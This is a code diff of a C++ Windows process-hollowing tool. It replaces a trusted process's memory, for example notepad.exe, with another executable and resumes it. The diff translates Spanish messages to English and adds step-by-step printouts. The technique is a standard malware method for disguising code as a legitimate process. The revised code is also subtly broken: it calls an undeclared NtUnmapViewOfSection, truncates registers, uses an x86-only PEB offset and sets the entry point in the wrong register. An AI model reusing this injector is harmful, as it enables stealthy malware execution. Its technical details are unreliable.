@@ -1,41 +1,8 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
-#include <psapi.h>
 
-#pragma comment(lib, "psapi.lib")
-
-typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
-    HANDLE ProcessHandle,
-    PVOID BaseAddress
-    );
-
-typedef NTSTATUS(NTAPI* _NtQueryInformationProcess)(
-    HANDLE ProcessHandle,
-    DWORD ProcessInformationClass,
-    PVOID ProcessInformation,
-    ULONG ProcessInformationLength,
-    PULONG ReturnLength
-    );
-
-typedef struct _PROCESS_BASIC_INFORMATION {
-    PVOID Reserved1;
-    PVOID PebBaseAddress;
-    PVOID Reserved2[2];
-    ULONG_PTR UniqueProcessId;
-    PVOID Reserved3;
-} PROCESS_BASIC_INFORMATION;
-
-typedef struct BASE_RELOCATION_BLOCK {
-    DWORD PageAddress;
-    DWORD BlockSize;
-} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;
-
-typedef struct BASE_RELOCATION_ENTRY {
-    USHORT Offset : 12;
-    USHORT Type : 4;
-} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
-
+// Helper function to handle errors
 void ErrorExit(const char* message) {
     std::cerr << message << " Error: " << GetLastError() << std::endl;
     exit(1);
@@ -43,17 +10,20 @@ void ErrorExit(const char* message) {
 
 int main(int argc, char* argv[]) {
     if (argc != 3) {
-        std::cout << "Uso: " << argv[0] << " <proceso_legítimo> <proceso_a_inyectar>" << std::endl;
-        std::cout << "Ejemplo: " << argv[0] << " C:\\Windows\\System32\\notepad.exe C:\\ruta\\a\\mi_app.exe" << std::endl;
+        std::cout << "Usage: " << argv[0] << " <legitimate_process> <process_to_inject>" << std::endl;
+        std::cout << "Example: " << argv[0] << " C:\\Windows\\System32\\notepad.exe C:\\path\\to\\my_app.exe" << std::endl;
         return 1;
     }
 
-    std::string targetProcess = argv[1];
-    std::string sourceProcess = argv[2];
+    std::string targetProcess = argv[1];    // Legitimate file
+    std::string sourceProcess = argv[2];    // File to be injected
+
+    // Step 1: Read the executable file to inject
+    std::cout << "\nStep 1: Reading the executable file to inject..." << std::endl;
 
     HANDLE sourceFile = CreateFileA(sourceProcess.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (sourceFile == INVALID_HANDLE_VALUE) {
-        ErrorExit("No se pudo abrir el archivo de origen");
+        ErrorExit("Could not open source file");
     }
 
     DWORD sourceFileSize = GetFileSize(sourceFile, NULL);
@@ -61,13 +31,22 @@ int main(int argc, char* argv[]) {
 
     DWORD bytesRead = 0;
     if (!ReadFile(sourceFile, sourceFileBytesBuffer, sourceFileSize, &bytesRead, NULL)) {
-        ErrorExit("No se pudo leer el archivo de origen");
+        ErrorExit("Could not read source file");
     }
 
     CloseHandle(sourceFile);
 
+    // Step 2: Analyze the PE headers
+    std::cout << "Step 2: Analyzing PE headers of the executable to inject..." << std::endl;
+
     PIMAGE_DOS_HEADER sourceImageDOSHeader = (PIMAGE_DOS_HEADER)sourceFileBytesBuffer;
     PIMAGE_NT_HEADERS sourceImageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)sourceFileBytesBuffer + sourceImageDOSHeader->e_lfanew);
+
+    std::cout << "  - Entry point: 0x" << std::hex << sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint << std::endl;
+    std::cout << "  - Image base address: 0x" << std::hex << sourceImageNTHeaders->OptionalHeader.ImageBase << std::endl;
+
+    // Step 3: Create legitimate process in suspended state
+    std::cout << "\nStep 3: Creating legitimate process in suspended state..." << std::endl;
 
     STARTUPINFOA startupInfo;
     PROCESS_INFORMATION processInfo;
@@ -77,67 +56,66 @@ int main(int argc, char* argv[]) {
     startupInfo.cb = sizeof(startupInfo);
 
     if (!CreateProcessA(
-        targetProcess.c_str(),
-        NULL,
-        NULL,
-        NULL,
-        FALSE,
-        CREATE_SUSPENDED,
-        NULL,
-        NULL,
-        &startupInfo,
-        &processInfo
+        targetProcess.c_str(),     // Name of process to create
+        NULL,                      // Command line parameters
+        NULL,                      // Process security attributes
+        NULL,                      // Thread security attributes
+        FALSE,                     // Handle inheritance
+        CREATE_SUSPENDED,          // Creation flags - SUSPENDED
+        NULL,                      // Process environment
+        NULL,                      // Current directory
+        &startupInfo,              // Startup information
+        &processInfo               // Process information
     )) {
-        ErrorExit("No se pudo crear el proceso legítimo");
+        ErrorExit("Could not create legitimate process");
     }
 
-    LPVOID imageBaseAddress = NULL;
+    std::cout << "  - Process created with PID: " << processInfo.dwProcessId << std::endl;
 
-    MODULEINFO moduleInfo;
-    HMODULE hModule;
-    DWORD cbNeeded;
+    // Step 4: Get the base address of the legitimate process
+    std::cout << "\nStep 4: Getting information about the legitimate process..." << std::endl;
 
-    if (EnumProcessModules(processInfo.hProcess, &hModule, sizeof(hModule), &cbNeeded)) {
-        if (GetModuleInformation(processInfo.hProcess, hModule, &moduleInfo, sizeof(moduleInfo))) {
-            imageBaseAddress = moduleInfo.lpBaseOfDll;
-        }
-        else {
-            ErrorExit("GetModuleInformation falló");
-        }
-    }
-    else {
-        ErrorExit("EnumProcessModules falló");
+    CONTEXT context;
+    context.ContextFlags = CONTEXT_FULL;
+
+    if (!GetThreadContext(processInfo.hThread, &context)) {
+        ErrorExit("Could not get thread context");
     }
 
-    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
-    if (!hNtdll) {
-        ErrorExit("No se pudo obtener el handle de ntdll.dll");
+    // In x86, the EBX register points to the PEB
+    DWORD pebAddress = context.Rbx;
+
+    // The process base address is at offset 0x8 of the PEB
+    LPVOID imageBaseAddress = 0;
+    SIZE_T bytesRead2 = 0;
+
+    if (!ReadProcessMemory(
+        processInfo.hProcess,
+        (LPVOID)(pebAddress + 8),
+        &imageBaseAddress,
+        sizeof(LPVOID),
+        &bytesRead2
+    )) {
+        ErrorExit("Could not read process base address");
     }
 
-    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(
-        hNtdll,
-        "NtUnmapViewOfSection"
-    );
+    std::cout << "  - Base address of legitimate process: 0x" << std::hex << (DWORD_PTR)imageBaseAddress << std::endl;
 
-    if (!NtUnmapViewOfSection) {
-        ErrorExit("No se pudo obtener la dirección de NtUnmapViewOfSection");
-    }
+    // Step 5: Unmap memory from legitimate process
+    std::cout << "\nStep 5: Unmapping memory from legitimate process..." << std::endl;
 
-    NTSTATUS status = NtUnmapViewOfSection(
+    if (!NtUnmapViewOfSection(
         processInfo.hProcess,
         imageBaseAddress
-    );
-
-    if (status != 0) {
-        if (!VirtualFreeEx(
-            processInfo.hProcess,
-            imageBaseAddress,
-            0,
-            MEM_RELEASE
-        )) {
-            std::cout << "VirtualFreeEx también falló, continuando..." << std::endl;
-        }
+    )) {
+        std::cout << "  - Memory unmapped successfully" << std::endl;
     }
+    else {
+        ErrorExit("Could not unmap process memory");
+    }
+
+    // Step 6: Allocate new memory in legitimate process
+    std::cout << "\nStep 6: Allocating new memory in legitimate process..." << std::endl;
 
     LPVOID newBaseAddress = VirtualAllocEx(
         processInfo.hProcess,
@@ -148,18 +126,13 @@ int main(int argc, char* argv[]) {
     );
 
     if (!newBaseAddress) {
-        newBaseAddress = VirtualAllocEx(
-            processInfo.hProcess,
-            NULL,
-            sourceImageNTHeaders->OptionalHeader.SizeOfImage,
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
-        );
-
-        if (!newBaseAddress) {
-            ErrorExit("No se pudo asignar memoria en el proceso legítimo");
-        }
+        ErrorExit("Could not allocate memory in legitimate process");
     }
+
+    std::cout << "  - New memory allocated at: 0x" << std::hex << (DWORD_PTR)newBaseAddress << std::endl;
+
+    // Step 7: Write PE headers to legitimate process
+    std::cout << "\nStep 7: Writing PE headers to legitimate process..." << std::endl;
 
     if (!WriteProcessMemory(
         processInfo.hProcess,
@@ -168,14 +141,19 @@ int main(int argc, char* argv[]) {
         sourceImageNTHeaders->OptionalHeader.SizeOfHeaders,
         NULL
     )) {
-        ErrorExit("No se pudieron escribir los encabezados PE");
+        ErrorExit("Could not write PE headers");
     }
+
+    // Step 8: Write PE sections to legitimate process
+    std::cout << "\nStep 8: Writing PE sections to legitimate process..." << std::endl;
 
     PIMAGE_SECTION_HEADER sourceImageSectionHeader = (PIMAGE_SECTION_HEADER)(
         (DWORD_PTR)sourceImageNTHeaders + sizeof(IMAGE_NT_HEADERS)
         );
 
     for (int i = 0; i < sourceImageNTHeaders->FileHeader.NumberOfSections; i++) {
+        std::cout << "  - Writing section: " << sourceImageSectionHeader->Name << std::endl;
+
         LPVOID sectionDestination = (LPVOID)(
             (DWORD_PTR)newBaseAddress + sourceImageSectionHeader->VirtualAddress
             );
@@ -191,38 +169,36 @@ int main(int argc, char* argv[]) {
             sourceImageSectionHeader->SizeOfRawData,
             NULL
         )) {
-            ErrorExit("No se pudo escribir una sección del PE");
+            ErrorExit("Could not write a PE section");
         }
 
         sourceImageSectionHeader++;
     }
 
-    CONTEXT context;
-    context.ContextFlags = CONTEXT_FULL;
+    // Step 9: Update thread context to point to the new entry point
+    std::cout << "\nStep 9: Updating thread context..." << std::endl;
 
-    if (!GetThreadContext(processInfo.hThread, &context)) {
-        ErrorExit("No se pudo obtener el contexto del hilo");
-    }
-
-#ifdef _WIN64
-    context.Rcx = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
-#else
-    context.Eax = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
-#endif
+    context.Rbx = (DWORD_PTR)newBaseAddress + sourceImageNTHeaders->OptionalHeader.AddressOfEntryPoint;
 
     if (!SetThreadContext(processInfo.hThread, &context)) {
-        ErrorExit("No se pudo establecer el contexto del hilo");
+        ErrorExit("Could not set thread context");
     }
+
+    std::cout << "  - New entry point: 0x" << std::hex << context.Rbx << std::endl;
+
+    // Step 10: Resume execution of legitimate process
+    std::cout << "\nStep 10: Resuming process execution..." << std::endl;
 
     if (ResumeThread(processInfo.hThread) == -1) {
-        ErrorExit("No se pudo reanudar el hilo");
+        ErrorExit("Could not resume thread");
     }
 
+    std::cout << "  - Process resumed successfully" << std::endl;
+
+    // Free resources
     HeapFree(GetProcessHeap(), 0, sourceFileBytesBuffer);
     CloseHandle(processInfo.hProcess);
     CloseHandle(processInfo.hThread);
-
-    std::cout << "Process Hollowing completado." << std::endl;
 
     return 0;
 }
